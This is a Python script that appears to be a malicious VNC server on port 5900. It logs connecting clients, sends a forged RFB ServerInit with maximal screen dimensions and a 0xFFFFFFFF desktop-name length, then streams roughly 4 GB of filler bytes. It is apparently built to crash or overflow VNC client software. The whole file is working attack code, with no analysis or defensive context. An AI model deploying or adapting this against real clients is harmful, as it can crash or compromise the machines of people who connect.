#!/usr/bin/env python3
#import struct
import socket

logf = 'logfile'
host = ''
port = 5900

log = open('logfile', 'a')

p_protoversion = b'RFB 003.003\n'
p_securityhandshake = b'\x00\x00\x00\x01'
p_serverinit = b'\xFF\xFF\xFF\xFF\x20\x20\x01\x01\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00'
p_bell = b'\x02'
p_much = b'\xFF\xFF\xFF\xFF'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)

while True:
	conn, addr = s.accept()
	print("Accepted connection from {}".format(addr))
	log.write("Accepted connection from {}\n".format(addr))

	conn.send(p_protoversion)
	data = conn.recv(1024)
	print(data)
	
	conn.send(p_securityhandshake)
	data = conn.recv(1024)
	print(data)

	conn.send(p_serverinit)
	conn.send(p_much)
	conn.send(b'!'*0xFFFFFFFF)
	data = conn.recv(1024)
	print(data)

	while True:
		data = conn.recv(1024)
		if not data:
			break
		print(data)
	conn.close()
s.close()
log.close()


